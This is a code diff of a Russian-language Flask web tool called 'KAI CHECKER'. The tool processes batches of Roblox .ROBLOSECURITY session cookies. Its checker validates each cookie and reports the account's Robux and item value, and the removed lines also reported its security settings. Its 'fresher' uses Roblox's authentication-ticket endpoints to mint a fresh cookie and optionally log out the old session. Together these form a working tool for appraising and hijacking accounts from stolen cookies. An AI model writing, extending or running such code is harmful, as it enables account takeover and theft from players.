@@ -1,77 +1,27 @@
-import requests, json, time, logging, re, os, urllib3, html, sys, asyncio, zipfile, urllib.parse, io, csv
-from typing import Dict, List, Optional
+import requests, json, time, logging, re, os, urllib3, html, sys, asyncio, zipfile
 from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from flask import Flask, render_template_string, request, jsonify, send_file, send_from_directory
-from io import BytesIO, StringIO
+from flask import Flask, render_template_string, request, jsonify, send_from_directory
+from io import BytesIO
 from curl_cffi.requests import AsyncSession
 
 # ===== НАСТРОЙКИ =====
-os.makedirs("data/profiles", exist_ok=True)
-os.makedirs("data/logs", exist_ok=True)
-os.makedirs("input", exist_ok=True)
-os.makedirs("output", exist_ok=True)
 os.makedirs("downloads", exist_ok=True)
-
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s',
-                    handlers=[logging.FileHandler('data/logs/bot.log', encoding='utf-8'), logging.StreamHandler()])
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
-logging.getLogger("urllib3").setLevel(logging.WARNING)
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 try:
     from curl_cffi import requests as cffi_requests
     HAS_CFFI = True
 except ImportError:
-    cffi_requests = None
     HAS_CFFI = False
-
-# ===== СЛОВАРЬ ИГР =====
-MAIN_GAMES = {
-    "blox fruits", "rivals", "adopt me", "pet sim 99",
-    "pets go", "mm2", "brookhaven", "fisch", "king legacy", "gpo",
-    "blade ball", "bedwars", "jailbreak", "da hood", "tsb",
-    "astd", "anime vanguards", "aot revolution", "aut", "aa", "als",
-    "combat warriors", "creatures of sonaria", "driving empire", "evade",
-    "ro ghoul", "royale high", "toilet td", "trident survival",
-    "war tycoon", "yba", "99 nights", "spongebob td", "fnaf td",
-    "garden td", "jujutsu infinite", "jujutsu shenanigans",
-    "tds", "volleyball legends", "arsenal", "bee swarm",
-    "dress to impress"
-}
-
-def is_main_game(game_name: str) -> bool:
-    if not game_name:
-        return False
-    g_lower = game_name.lower().strip()
-    for mg in MAIN_GAMES:
-        if mg in g_lower or g_lower in mg:
-            return True
-    return False
 
 # ============================================================
 # ФУНКЦИИ
 # ============================================================
 
-def create_session(cookie: str) -> requests.Session:
-    s = requests.Session()
-    s.headers.update({
-        'Cookie': f'.ROBLOSECURITY={cookie.strip()}',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-        'Accept': 'application/json'
-    })
-    return s
-
 def get_full_info(cookie: str) -> dict:
-    info = {
-        'status': '⚠️', 'Username': '?', 'UserID': '?', 'Robux': 0,
-        'PendingRobux': 0, 'OutgoingRobuxYear': 0, 'Created': '?',
-        'RegistrationDays': 0, 'EmailSet': False, 'TwoFactorEnabled': False,
-        'AccountPinEnabled': False, 'PhoneSet': False, 'CardsCount': 0,
-        'Country': '?', 'Premium': False, 'Playtime': {}, 'TotalRAP': 0,
-        'RareItems': [], 'PurchasedGamepasses': {}, 'TotalInventory': 0,
-        'Cookie': cookie, 'SecurityStatus': '⚠️ НЕЗАЩИЩЕННЫЙ'
-    }
+    info = {'status': '⚠️', 'Username': '?', 'Robux': 0, 'TotalRAP': 0}
     try:
         s = requests.Session()
         s.headers.update({
@@ -85,344 +35,105 @@ def get_full_info(cookie: str) -> dict:
             info['UserID'] = d.get('id')
             info['Username'] = d.get('name')
             info['status'] = '✅'
-        elif r.status_code == 401:
-            info['status'] = '❌'
-            return info
-        elif r.status_code == 403:
-            info['status'] = '🚫'
-            return info
         else:
+            info['status'] = '❌'
             return info
         uid = info['UserID']
 
-        def g(url):
-            try:
-                r = s.get(url, verify=False, timeout=10)
-                return r.json() if r.status_code == 200 else {}
-            except:
-                return {}
+        rb = s.get(f'https://economy.roblox.com/v1/users/{uid}/currency', verify=False, timeout=10)
+        if rb.status_code == 200:
+            info['Robux'] = rb.json().get('robux', 0)
 
-        d = g('https://www.roblox.com/my/settings/json')
-        if d:
-            info['RegistrationDays'] = d.get('AccountAgeInDays', 0)
-            info['Premium'] = d.get('IsPremium', False)
-            security = d.get('MyAccountSecurityModel', {})
-            info['EmailSet'] = security.get('IsEmailSet', False)
-            info['TwoFactorEnabled'] = security.get('IsTwoStepEnabled', False)
-            info['AccountPinEnabled'] = security.get('IsAccountPinEnabled', False)
-            info['PhoneSet'] = security.get('IsPhoneSet', False)
-
-        rd = g(f'https://users.roblox.com/v1/users/{uid}')
-        if rd:
-            try:
-                dt = datetime.fromisoformat(rd.get('created', '').replace('Z', '+00:00'))
-                info['Created'] = dt.strftime('%d.%m.%Y')
-            except:
-                pass
-
-        rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
-        if rb:
-            info['Robux'] = rb.get('robux', 0)
-
-        td = g(f'https://economy.roblox.com/v2/users/{uid}/transaction-totals?timeFrame=Year&transactionType=summary')
-        if td:
-            info['PendingRobux'] = td.get('pendingRobuxTotal', 0)
-            info['OutgoingRobuxYear'] = td.get('outgoingRobuxTotal', 0)
-
-        cards = g('https://apis.roblox.com/payments-gateway/v1/payment-profiles')
-        info['CardsCount'] = len(cards) if isinstance(cards, list) else 0
-
-        country = g('https://users.roblox.com/v1/users/authenticated/country-code')
-        if country:
-            info['Country'] = country.get('countryCode', '?')
-
-        try:
-            tr = 0
-            ri = []
-            ir = s.get(f'https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?limit=100&sortOrder=Desc', verify=False, timeout=10)
-            if ir.status_code == 200:
-                data = ir.json()
-                for item in data.get('data', []):
-                    asset_id = item.get('assetId')
-                    rap = item.get('recentAveragePrice', 0) or 0
-                    tr += rap
-                    if rap >= 1000:
-                        ri.append({'name': item.get('name', '?'), 'rap': rap})
-                info['TotalInventory'] = len(data.get('data', []))
-            info['TotalRAP'] = tr
-            ri.sort(key=lambda x: x['rap'], reverse=True)
-            info['RareItems'] = ri[:10]
-        except:
-            pass
-
-        try:
-            gp_url = f"https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase"
-            cursor = ""
-            page = 0
-            gamepasses_dict = {}
-            
-            while page < 10:
-                url = gp_url + f"&cursor={cursor}" if cursor else gp_url
-                r = s.get(url, verify=False, timeout=12)
-                if r.status_code != 200:
-                    break
-                data = r.json()
-                for item in data.get('data', []):
-                    details = item.get('details', {})
-                    item_type = str(details.get('type', ''))
-                    price = abs(item.get('currency', {}).get('amount', 0))
-                    if price >= 100 and (item_type in ['GamePass', 'DeveloperProduct'] or 'GamePass' in str(details)):
-                        name = details.get('name', 'Товар')
-                        place_info = details.get('place', {})
-                        place_name = place_info.get('name', 'Неизвестная игра')
-                        if place_name not in gamepasses_dict:
-                            gamepasses_dict[place_name] = []
-                        gamepasses_dict[place_name].append({'name': name, 'price': price})
-                cursor = data.get('nextPageCursor')
-                if not cursor:
-                    break
-                page += 1
-                time.sleep(0.15)
-            
-            info['PurchasedGamepasses'] = gamepasses_dict
-        except Exception as e:
-            logger.error(f"Gamepass error: {e}")
-
-        security_score = 0
-        if info.get('EmailSet'): security_score += 1
-        if info.get('TwoFactorEnabled'): security_score += 2
-        if info.get('AccountPinEnabled'): security_score += 1
-        if info.get('PhoneSet'): security_score += 1
-
-        if security_score >= 4:
-            info['SecurityStatus'] = '🔒 ВЫСОКИЙ'
-        elif security_score >= 2:
-            info['SecurityStatus'] = '🔐 СРЕДНИЙ'
-        else:
-            info['SecurityStatus'] = '⚠️ НИЗКИЙ (НЕЗАЩИЩЕН!)'
-    except Exception as e:
-        logger.error(f"Err: {e}")
+        ir = s.get(f'https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?limit=100&sortOrder=Desc', verify=False, timeout=10)
+        if ir.status_code == 200:
+            total_rap = 0
+            for item in ir.json().get('data', []):
+                total_rap += item.get('recentAveragePrice', 0) or 0
+            info['TotalRAP'] = total_rap
+    except:
+        pass
     return info
-
-# ============================================================
-# ФОРМАТИРОВАНИЕ ОТЧЁТА
-# ============================================================
-
-def format_short_report(info):
-    un = html.escape(str(info.get('Username', '?')))
-    year = info.get('Created', '????')[-4:] if info.get('Created') else '?'
-    status = info.get('status', '⚠️')
-    status_icon = '🟢' if status == '✅' else ('🔴' if status == '❌' else '🚫')
-    status_text = 'VALID' if status == '✅' else ('INVALID' if status == '❌' else 'BANNED')
-    
-    r = f"📋 {un} [{year}]\n"
-    r += f"{status_icon} {status_text} | 🆔 {info.get('UserID', '?')}\n\n"
-    r += f"📅 {info.get('Created', '?')} | 🌍 {info.get('Country', '?')} | {'⭐ Premium' if info.get('Premium') else '❌ Premium'}\n"
-    r += f"💰 Robux: ⏣ {info.get('Robux', 0):,} | 💸 Донат: ⏣ {abs(info.get('OutgoingRobuxYear', 0)):,}\n"
-    
-    rap = info.get('TotalRAP', 0)
-    if rap > 0:
-        r += f"💎 RAP: ⏣ {rap:,}\n"
-    else:
-        r += f"💎 RAP: ❌ Нет\n"
-    
-    r += f"\n🛡️ БЕЗОПАСНОСТЬ:\n"
-    r += f"   📧 Почта: {'✅' if info.get('EmailSet') else '❌'}\n"
-    r += f"   🔐 2FA: {'✅' if info.get('TwoFactorEnabled') else '❌'}\n"
-    r += f"   {info.get('SecurityStatus', '⚠️ НЕЗАЩИЩЕННЫЙ')}\n"
-    r += f"   💳 Карты: {info.get('CardsCount', 0)} | 📦 Предметы: {info.get('TotalInventory', 0)}\n"
-    
-    gp = info.get('PurchasedGamepasses', {})
-    main_gp = {game: passes for game, passes in gp.items() if is_main_game(game)}
-    
-    if main_gp:
-        total_sum = sum(sum(p['price'] for p in passes) for passes in main_gp.values())
-        r += f"\n📦 ГЕЙМПАССЫ (главные игры):\n"
-        for game, passes in list(main_gp.items())[:5]:
-            game_total = sum(p['price'] for p in passes)
-            r += f"   🎮 {game} (⏣ {game_total:,}):\n"
-            for p in passes[:5]:
-                r += f"      └ {p['name']} — ⏣ {p['price']:,}\n"
-            if len(passes) > 5:
-                r += f"      └ ...и ещё {len(passes)-5}\n"
-    else:
-        r += f"\n📦 ГЕЙМПАССЫ: ❌ Нет\n"
-    
-    rare = info.get('RareItems', [])
-    if rare:
-        r += f"\n💎 РЕДКИЕ ПРЕДМЕТЫ ({len(rare)} шт):\n"
-        for item in rare[:3]:
-            r += f"   └ {item['name']} (⏣ {item['rap']:,})\n"
-    else:
-        r += f"\n💎 РЕДКИЕ ПРЕДМЕТЫ: ❌ Нет\n"
-    
-    if len(r) > 3800:
-        r = r[:3700] + "\n\n<i>[Сообщение сокращено]</i>"
-    
-    return f"<blockquote>{r}\n\n<code>{info.get('Cookie', '')}</code></blockquote>"
-
-def generate_full_txt_report(info):
-    un = info.get('Username', '?')
-    year = info.get('Created', '????')[-4:] if info.get('Created') else '?'
-    status = info.get('status', '⚠️')
-    status_text = 'VALID' if status == '✅' else ('INVALID' if status == '❌' else 'BANNED')
-    
-    r = f"╔══════════════════════════════════════════════════════════╗\n"
-    r += f"║  🎮 KAI CHECKER — ПОЛНЫЙ ОТЧЁТ                        ║\n"
-    r += f"╠══════════════════════════════════════════════════════════╣\n"
-    r += f"║  📋 {un} [{year}]\n"
-    r += f"║  {status_text} | 🆔 {info.get('UserID', '?')}\n"
-    r += f"║  📅 {info.get('Created', '?')} | 🌍 {info.get('Country', '?')}\n"
-    r += f"╠══════════════════════════════════════════════════════════╣\n"
-    r += f"║  💰 Robux: ⏣ {info.get('Robux', 0):,}\n"
-    r += f"║  💸 Донат/год: ⏣ {abs(info.get('OutgoingRobuxYear', 0)):,}\n"
-    r += f"║  💎 RAP: ⏣ {info.get('TotalRAP', 0):,}\n"
-    r += f"╠══════════════════════════════════════════════════════════╣\n"
-    r += f"║  🛡️ БЕЗОПАСНОСТЬ:\n"
-    r += f"║  📧 Почта: {'✅' if info.get('EmailSet') else '❌'} | 🔐 2FA: {'✅' if info.get('TwoFactorEnabled') else '❌'}\n"
-    r += f"║  {info.get('SecurityStatus', '⚠️ НЕЗАЩИЩЕННЫЙ')}\n"
-    r += f"║  💳 Карты: {info.get('CardsCount', 0)} | 📦 Предметы: {info.get('TotalInventory', 0)}\n"
-    r += f"╠══════════════════════════════════════════════════════════╣\n"
-    r += f"║  📦 ВСЕ ГЕЙМПАССЫ:\n"
-    
-    gp = info.get('PurchasedGamepasses', {})
-    if gp:
-        for game, passes in gp.items():
-            game_total = sum(p['price'] for p in passes)
-            r += f"║  🎮 {game} (⏣ {game_total:,}):\n"
-            for p in passes[:5]:
-                r += f"║      └ {p['name']} — ⏣ {p['price']:,}\n"
-            if len(passes) > 5:
-                r += f"║      └ ...и ещё {len(passes)-5}\n"
-    else:
-        r += f"║  ❌ Нет геймпассов\n"
-    
-    rare = info.get('RareItems', [])
-    if rare:
-        r += f"╠══════════════════════════════════════════════════════════╣\n"
-        r += f"║  💎 РЕДКИЕ ПРЕДМЕТЫ ({len(rare)} шт):\n"
-        for item in rare[:10]:
-            r += f"║    └ {item['name']} (⏣ {item['rap']:,})\n"
-    
-    r += f"╚══════════════════════════════════════════════════════════╝\n\n"
-    r += f"🍪 COOKIE:\n{info.get('Cookie', '')}"
-    return r
-
-def save_txt(info):
-    un = re.sub(r'[<>:"/\\|?*]', '_', str(info.get('Username', '?')))
-    fn = f"roblox_{un}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-    with open(fn, 'w', encoding='utf-8') as f:
-        f.write(generate_full_txt_report(info))
-    return fn
 
 # ============================================================
 # ФРЕШЕР
 # ============================================================
 
-async def refresh_roblox_cookie(old_cookie: str, kill_old: bool = True) -> tuple[bool, str, str]:
+async def refresh_roblox_cookie(old_cookie: str, kill_old: bool = True) -> tuple:
     if not HAS_CFFI:
         return False, None, "❌ Установите curl_cffi"
     
-    logs = []
     headers_base = {
         "Cookie": f".ROBLOSECURITY={old_cookie.strip()}",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Origin": "https://www.roblox.com",
         "Referer": "https://www.roblox.com/"
     }
     
     async with AsyncSession(impersonate="chrome120") as session:
-        # ===== 1. CSRF =====
+        # CSRF
         csrf_token = None
-        for attempt in range(3):
+        for _ in range(3):
             try:
-                r_csrf = await session.post("https://auth.roblox.com/v2/logout", headers=headers_base, timeout=10)
-                csrf_token = r_csrf.headers.get("x-csrf-token")
+                r = await session.post("https://auth.roblox.com/v2/logout", headers=headers_base, timeout=10)
+                csrf_token = r.headers.get("x-csrf-token")
                 if csrf_token:
                     break
-                logs.append(f"Попытка {attempt+1}: CSRF не получен")
-                await asyncio.sleep(0.5)
-            except Exception as e:
-                logs.append(f"Попытка {attempt+1}: {str(e)}")
-        
+            except:
+                pass
         if not csrf_token:
-            return False, None, "❌ CSRF token не получен после 3 попыток"
-        
-        # ===== 2. TICKET =====
+            return False, None, "❌ CSRF не получен"
+
+        # Ticket
         ticket_headers = headers_base.copy()
-        ticket_headers.update({
-            "x-csrf-token": csrf_token,
-            "RBXAuthenticationNegotiation": "1",
-            "Content-Type": "application/json"
-        })
-        
+        ticket_headers.update({"x-csrf-token": csrf_token, "RBXAuthenticationNegotiation": "1"})
         ticket = None
-        for attempt in range(3):
+        for _ in range(3):
             try:
-                r_ticket = await session.post("https://auth.roblox.com/v1/authentication-ticket", headers=ticket_headers, json={}, timeout=10)
-                ticket = r_ticket.headers.get("rbx-authentication-ticket")
+                r = await session.post("https://auth.roblox.com/v1/authentication-ticket", headers=ticket_headers, json={}, timeout=10)
+                ticket = r.headers.get("rbx-authentication-ticket")
                 if ticket:
                     break
-                logs.append(f"Попытка {attempt+1}: Ticket не получен")
-                await asyncio.sleep(0.5)
-            except Exception as e:
-                logs.append(f"Попытка {attempt+1}: {str(e)}")
-        
+            except:
+                pass
         if not ticket:
             return False, None, "❌ Ticket не получен"
-        
-        # ===== 3. REDEEM =====
-        redeem_headers = {
-            "User-Agent": "Roblox/WinInet",
-            "RBXAuthenticationNegotiation": "1",
-            "Content-Type": "application/json"
-        }
-        
+
+        # Redeem
         new_cookie = None
-        for attempt in range(3):
+        for _ in range(3):
             try:
-                r_redeem = await session.post("https://auth.roblox.com/v1/authentication-ticket/redeem", headers=redeem_headers, json={"authenticationTicket": ticket}, timeout=10)
-                set_cookie = r_redeem.headers.get("set-cookie", "")
+                r = await session.post("https://auth.roblox.com/v1/authentication-ticket/redeem", 
+                                      headers={"User-Agent": "Roblox/WinInet", "RBXAuthenticationNegotiation": "1"}, 
+                                      json={"authenticationTicket": ticket}, timeout=10)
+                set_cookie = r.headers.get("set-cookie", "")
                 if ".ROBLOSECURITY=" in set_cookie:
                     parts = set_cookie.split(".ROBLOSECURITY=")
                     if len(parts) > 1:
                         new_cookie = parts[1].split(";")[0]
                         if new_cookie and new_cookie != old_cookie:
                             break
-                logs.append(f"Попытка {attempt+1}: Новый кук не получен")
-                await asyncio.sleep(0.5)
-            except Exception as e:
-                logs.append(f"Попытка {attempt+1}: {str(e)}")
-        
-        if not new_cookie or new_cookie == old_cookie:
-            return False, None, "❌ Не удалось получить новый кук"
-        
-        # ===== 4. KILL OLD =====
+            except:
+                pass
+        if not new_cookie:
+            return False, None, "❌ Новый кук не получен"
+
         if kill_old:
             try:
                 await session.post("https://auth.roblox.com/v2/logout", headers=ticket_headers, timeout=5)
-                logs.append("✅ Старая сессия убита")
             except:
-                logs.append("⚠️ Не удалось убить старую сессию")
-        else:
-            logs.append("ℹ️ Старая сессия сохранена")
-        
-        return True, new_cookie, "\n".join(logs)
+                pass
 
-def refresh_cookie_sync(cookie: str, kill_old: bool = True) -> tuple[bool, str, str]:
-    loop = None
+        return True, new_cookie, "✅ Успешно"
+
+def refresh_cookie_sync(cookie: str, kill_old: bool = True) -> tuple:
     try:
         if sys.platform == 'win32':
             asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
-        res = loop.run_until_complete(refresh_roblox_cookie(cookie, kill_old))
-        return res
+        return loop.run_until_complete(refresh_roblox_cookie(cookie, kill_old))
     except Exception as e:
         return False, None, f"[ERROR] {e}"
-    finally:
-        if loop and not loop.is_closed():
-            loop.close()
 
 # ============================================================
 # ВЕБ-СЕРВЕР
@@ -446,7 +157,6 @@ HTML = """<!DOCTYPE html>
             background: #0b081a;
             background-image: radial-gradient(circle at 10% 20%, #1a1040 0%, #0b081a 80%);
         }
-        /* ===== РАМКА ВОКРУГ ВСЕГО ===== */
         .kai-wrapper {
             max-width: 1400px;
             margin: 0 auto;
@@ -461,7 +171,6 @@ HTML = """<!DOCTYPE html>
         ::-webkit-scrollbar-track { background: #1a1040; border-radius: 8px; }
         ::-webkit-scrollbar-thumb { background: #a855f7; border-radius: 8px; }
 
-        /* ===== ШАПКА ===== */
         .header {
             display: flex; justify-content: space-between; align-items: center;
             padding: 20px 0 16px; border-bottom: 1px solid #2a1a50;
@@ -482,7 +191,6 @@ HTML = """<!DOCTYPE html>
             -webkit-text-fill-color: #a78bfa;
         }
 
-        /* ===== ВКЛАДКИ ===== */
         .tabs {
             display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 28px;
         }
@@ -510,7 +218,6 @@ HTML = """<!DOCTYPE html>
         .tab-content.active { display: block; }
         @keyframes fadeUp { 0% { opacity: 0; transform: translateY(12px); } 100% { opacity: 1; transform: translateY(0); } }
 
-        /* ===== КАРТОЧКИ ===== */
         .card {
             background: rgba(18, 10, 40, 0.7);
             backdrop-filter: blur(12px);
@@ -531,7 +238,6 @@ HTML = """<!DOCTYPE html>
             display: flex; align-items: center; gap: 10px;
         }
 
-        /* ===== КНОПКИ ===== */
         .btn {
             padding: 12px 28px;
             border: none;
@@ -557,7 +263,6 @@ HTML = """<!DOCTYPE html>
         }
         .btn-secondary:hover { background: rgba(255,255,255,0.1); }
 
-        /* ===== ПОЛЯ ВВОДА ===== */
         textarea, .upload-area {
             width: 100%;
             padding: 14px 16px;
@@ -589,7 +294,6 @@ HTML = """<!DOCTYPE html>
         .upload-area p { pointer-events: none; color: #9880c0; }
         .upload-area strong { color: #c084fc; }
 
-        /* ===== РЕЗУЛЬТАТЫ ===== */
         .result-box {
             background: #0d0722;
             border: 1px solid #2a1a50;
@@ -610,7 +314,6 @@ HTML = """<!DOCTYPE html>
         .result-box .invalid { color: #f87171; }
         .result-box .info { color: #a78bfa; }
 
-        /* ===== КОПИРОВАНИЕ ===== */
         .cookie-output {
             display: flex;
             align-items: center;
@@ -645,7 +348,6 @@ HTML = """<!DOCTYPE html>
             color: #fff;
         }
 
-        /* ===== ПРОГРЕСС ===== */
         .progress-bar {
             margin-top: 12px;
             background: #0d0722;
@@ -661,7 +363,6 @@ HTML = """<!DOCTYPE html>
             transition: width 0.3s ease;
         }
 
-        /* ===== ФРЕШЕР (СТИЛЬ rblxrefresh) ===== */
         .fresh-card {
             background: rgba(12, 12, 24, 0.9);
             border: 1px solid #1f1f3a;
@@ -864,13 +565,11 @@ HTML = """<!DOCTYPE html>
 <body>
 <div class="kai-wrapper">
 
-    <!-- ===== ШАПКА ===== -->
     <div class="header">
         <div class="logo">KAI <span>CHECKER</span></div>
         <div style="color:#4a3a6a; font-size:14px;">⚡ PRO</div>
     </div>
 
-    <!-- ===== ВКЛАДКИ ===== -->
     <div class="tabs">
         <div class="tab active" data-tab="checker">🔍 Чекер</div>
         <div class="tab" data-tab="fresher">🔄 Фрешер</div>
@@ -878,9 +577,7 @@ HTML = """<!DOCTYPE html>
         <div class="tab" data-tab="tools">🧰 Инструменты</div>
     </div>
 
-    <!-- ========================================================== -->
-    <!-- ===== ЧЕКЕР ============================================== -->
-    <!-- ========================================================== -->
+    <!-- ===== ЧЕКЕР ===== -->
     <div class="tab-content active" id="tab-checker">
         <div class="card">
             <h2>🔍 Проверка куков</h2>
@@ -899,7 +596,7 @@ HTML = """<!DOCTYPE html>
             </div>
             <div style="margin-top:18px; display:flex; gap:12px; flex-wrap:wrap;">
                 <button class="btn btn-primary" onclick="runFullcheck()">🚀 Запустить проверку</button>
-                <button class="btn btn-secondary" onclick="document.getElementById('manualCookies').value='';document.getElementById('fullFile').value='';">🧹 Очистить</button>
+                <button class="btn btn-secondary" onclick="clearInputs()">🧹 Очистить</button>
             </div>
             <div class="progress-bar"><div class="fill" id="checkerProgress"></div></div>
             <div class="result-box" id="fullcheckResult"></div>
@@ -911,9 +608,7 @@ HTML = """<!DOCTYPE html>
         </div>
     </div>
 
-    <!-- ========================================================== -->
-    <!-- ===== ФРЕШЕР (СТИЛЬ rblxrefresh) ========================= -->
-    <!-- ========================================================== -->
+    <!-- ===== ФРЕШЕР ===== -->
     <div class="tab-content" id="tab-fresher">
         <div class="fresh-card">
             <div class="fresh-header">
@@ -953,9 +648,7 @@ HTML = """<!DOCTYPE html>
         </div>
     </div>
 
-    <!-- ========================================================== -->
-    <!-- ===== ВАЛИДАТОР ========================================== -->
-    <!-- ========================================================== -->
+    <!-- ===== ВАЛИДАТОР ===== -->
     <div class="tab-content" id="tab-validator">
         <div class="card">
             <h2>✅ Валидатор (отсев мёртвых)</h2>
@@ -968,9 +661,7 @@ HTML = """<!DOCTYPE html>
         </div>
     </div>
 
-    <!-- ========================================================== -->
-    <!-- ===== ИНСТРУМЕНТЫ ======================================== -->
-    <!-- ========================================================== -->
+    <!-- ===== ИНСТРУМЕНТЫ ===== -->
     <div class="tab-content" id="tab-tools">
         <div class="card">
             <h2>📂 Сортер (по одному)</h2>
@@ -1001,7 +692,7 @@ HTML = """<!DOCTYPE html>
         </div>
     </div>
 
-    <div class="footer">KAI CHECKER · PRO · Фрешер в стиле rblxrefresh</div>
+    <div class="footer">KAI CHECKER · PRO</div>
 </div>
 
 <!-- ========================================================== -->
@@ -1060,15 +751,6 @@ HTML = """<!DOCTYPE html>
         try {
             const response = await fetch('/api/fullcheck', { method: 'POST', body: formData });
             progress.style.width = '70%';
-            
-            const contentType = response.headers.get('content-type');
-            if (!contentType || !contentType.includes('application/json')) {
-                const text = await response.text();
-                resBox.className = 'result-box error';
-                resBox.textContent = '❌ Ошибка сервера. Проверь Flask.';
-                progress.style.width = '0%';
-                return;
-            }
             const data = await response.json();
             progress.style.width = '100%';
             setTimeout(() => { progress.style.width = '0%'; }, 1000);
@@ -1096,6 +778,11 @@ HTML = """<!DOCTYPE html>
             resBox.textContent = '❌ Ошибка: ' + e.message;
             progress.style.width = '0%';
         }
+    }
+
+    function clearInputs() {
+        document.getElementById('manualCookies').value = '';
+        document.getElementById('fullFile').value = '';
     }
 
     // ===== ИСТОРИЯ ЧЕКЕРА =====
@@ -1418,8 +1105,7 @@ def index():
 def api_fullcheck():
     if 'file' not in request.files:
         return jsonify({"success": False, "message": "Файл не найден"})
-    file = request.files['file']
-    content = file.read().decode('utf-8', errors='ignore')
+    content = request.files['file'].read().decode('utf-8', errors='ignore')
     cookies = [line.strip() for line in content.split('\n') if '.ROBLOSECURITY' in line and len(line) > 50]
     if not cookies:
         return jsonify({"success": False, "message": "Куки не найдены"})
@@ -1429,9 +1115,9 @@ def api_fullcheck():
     for c in cookies[:10]:
         info = get_full_info(c)
         if info['status'] == '✅':
-            reports.append(format_short_report(info))
-            total_rap += info.get('TotalRAP', 0)
-            total_gamepasses += len(info.get('PurchasedGamepasses', {}))
+            reports.append(f"📋 {info['Username']} | 💰 {info['Robux']} | 💎 {info['TotalRAP']}")
+            total_rap += info['TotalRAP']
+            total_gamepasses += 1
     return jsonify({
         "success": True,
         "total": len(cookies),
